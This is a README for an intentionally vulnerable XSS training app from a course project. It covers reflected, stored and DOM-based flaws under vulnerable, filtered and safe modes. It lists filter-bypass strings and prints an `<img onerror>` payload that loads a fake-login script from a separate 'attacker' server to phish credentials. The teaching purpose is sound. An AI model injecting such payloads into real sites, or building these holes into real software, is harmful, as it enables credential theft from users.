# XSS Lab

An intentionally vulnerable training application demonstrating **Cross-Site Scripting (XSS)**
attacks and the defenses against them. Built as a web application security course project.

Authors: **Piotr Kapeluszny, Jakub Siuzdak, Wojciech Aleksander**

> ⚠️ **This app is deliberately insecure.** Run it only locally or on a trusted network
> (a classroom). Never expose it to the internet.

## What it shows

Three types of XSS, each on its own page, plus a **security mode** toggle that lets you
show the same attack as working, hindered, and blocked.

| Page | XSS type | Where the flaw is |
|---|---|---|
| `/search` | **Reflected** | the `?q=` term is echoed back in the server response (fruit shop) |
| `/guestbook` | **Stored** | an entry saved on the server is served to every visitor |
| `/dom` | **DOM-based** | client-side script inserts the URL fragment after `#` into the page |

### Three modes (the "Przełącz tryb" button in the header)

| Mode | What it does | Result |
|---|---|---|
| 🔴 **Vulnerable** | data inserted raw (`<%- %>`, `innerHTML`) | attack works |
| 🟠 **Filtered** | naively strips `<script>` from the data | bypassable (`<img onerror>`, `<scr<script>ipt>`) |
| 🟢 **Safe** | output encoding + `Content-Security-Policy` + `HttpOnly` cookie | attack blocked |

The "Filtered" mode makes the point that **blacklisting tags is not a defense** — only
output encoding and CSP actually stop the attack.

## Running it

Requires **Node.js 18+**.

```bash
npm install
npm start
```

Open http://127.0.0.1:3000. `npm start` builds the Tailwind CSS first, then starts the server.

While working on styles, rebuild the CSS continuously (in a second terminal):

```bash
npm run dev
```

Tests (they check all three modes):

```bash
npm test
```

### Access from another computer on the local network

```bash
HOST=0.0.0.0 npm start
```

From the other machine, visit `http://THIS-COMPUTERS-IP:3000` (find the IP with `hostname -I`).
If the page won't load, open the port in the firewall: `sudo ufw allow 3000/tcp`.

## Phishing demonstration (the "attacker" server)

The [`attacker/`](attacker/) folder plays the attacker's server — it holds `fake-login.js`
with a fake login dialog. The XSS payload **loads that file from a separate server**, just
like a real attack (the attacker's code is not part of the victim app).

Run the attacker server separately:

```bash
python3 -m http.server 8000 --directory attacker
```

Example payload (injected on the victim, pulls the attacker's code):

```html
<img src=x onerror="s=document.createElement('script');s.src='http://localhost:8000/fake-login.js';document.body.appendChild(s)">
```

Across different computers, replace `localhost` with the attacker machine's IP.

## Structure

| Path | Contents |
|---|---|
| `server.js` | routes, mode toggle, defense headers, the `show()` helper |
| `views/*.ejs` | pages (EJS templates) |
| `views/partials/` | header, footer, defense banner |
| `data/products.js` | shop inventory for the search page (Reflected) |
| `public/js/dom.js` | script for the DOM-based page |
| `src/input.css` | Tailwind entry point and shared classes (`.card`, `.btn`, `.input`) |
| `attacker/` | the "attacker server" with the fake login dialog |

## Stack

Node.js · Express (routing) · EJS (templates) · Tailwind CSS v4 (styles). Data is kept
in memory (gone on restart), no database.
